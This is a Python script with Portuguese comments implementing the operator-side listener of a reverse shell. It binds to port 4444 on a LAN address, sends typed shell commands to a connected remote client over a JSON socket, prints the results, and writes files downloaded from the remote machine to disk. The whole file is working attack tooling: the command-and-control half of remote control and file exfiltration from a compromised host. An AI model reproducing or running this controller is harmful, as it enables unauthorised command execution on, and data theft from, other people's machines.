import socket, json, base64


# serialização:
# server: converte bytes em um objeto
# transferencia entre cliente e servidor
# client: converte um objeto em stream de bytes


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Reuse socket adress
        listener.bind((ip, port))
        listener.listen(0)  # Backlog: numero maximo de conexoes pendentes
        self.con, addr = listener.accept()  #
        print("Conectado com: {}\n".format(addr[0]))

    def serial_send(self, data):
        json_data = json.dumps(data)
        self.con.send(json_data.encode())

    def serial_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.con.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def write_file(self,path,content):
        content = base64.b64decode(content)
        if not isinstance(content,bytes):
            content = content.encode()
        with open(path, 'wb') as file:
            file.write(content)
            return "[+] Arquivo baixado"
    def exec_command(self, command):
        if ':q' == command[0]:
            self.serial_send('exit')
            self.con.close()
            exit()
        self.serial_send(command)
        retorno = self.serial_receive()
        return retorno

    def start(self):
        while True:
            command = input("-$  ")
            command = command.split(" ")
            result = self.exec_command(command)
            if command[0] == "download":
                result = self.write_file(command[1],result)

            print(result)


listener = Listener("192.168.0.102", 4444)
listener.start()
